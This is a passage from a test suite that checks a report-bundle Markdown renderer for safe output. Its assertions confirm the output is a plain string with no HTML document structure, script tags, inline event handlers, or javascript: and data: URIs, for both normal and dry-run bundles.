    expect(md).not.toMatch(/\bon\w+\s*=/i);
    expect(md).not.toMatch(/javascript\s*:/i);
    expect(md).not.toMatch(/data\s*:/i);
  });

  it("Markdown output is a plain-text string (no DOM/HTML structure)", () => {
    const bundle = makePublicReportBundle();
    const md = renderPublicReportBundle(bundle);
    // Output is a string, not a DOM node or HTML document
    expect(typeof md).toBe("string");
    // Does not start with DOCTYPE, <html>, or <head>
    expect(md.trimStart()).not.toMatch(/^<!DOCTYPE/i);
    expect(md.trimStart()).not.toMatch(/^<html/i);
    expect(md.trimStart()).not.toMatch(/^<head/i);
  });

  it("Markdown output for a dry-run bundle is equally safe", () => {
    const bundle = makePublicReportBundle({ dryRun: true });
    const md = renderPublicReportBundle(bundle);
    expect(md).not.toMatch(/<script/i);
    expect(md).not.toMatch(/javascript\s*:/i);
    expect(md).not.toMatch(/onerror\s*=/i);
  });
});
